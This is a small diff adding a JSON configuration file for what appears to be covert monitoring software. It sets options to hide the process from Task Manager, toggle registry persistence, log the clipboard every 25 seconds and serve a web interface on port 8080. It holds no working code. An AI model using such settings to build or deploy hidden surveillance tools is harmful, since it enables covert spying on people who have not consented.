@@ -1,0 +1,13 @@
+{
+    "stealth": {
+        "hide_from_taskmanager": true,
+        "registry_persistence": false
+    },
+    "logging": {
+        "clipboard_interval": 25
+    },
+    "web_interface": {
+        "enabled": true,
+        "port": 8080
+    }
+}
